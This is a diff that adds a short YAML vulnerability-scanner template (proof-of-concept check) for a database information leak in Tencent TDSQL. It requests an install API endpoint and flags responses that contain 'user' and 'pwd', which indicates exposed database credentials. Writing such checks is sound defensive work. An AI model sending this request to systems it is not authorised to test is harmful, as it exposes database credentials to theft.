@@ -1,0 +1,13 @@
+name: poc-yaml-腾讯-TDSQL-leak
+description: >-
+  数据库信息泄露
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /tdsqlpcloud/index.php/api/install/get_db_info
+    expression:
+      status: 200
+      body_all:
+        - "user"
+        - "pwd"
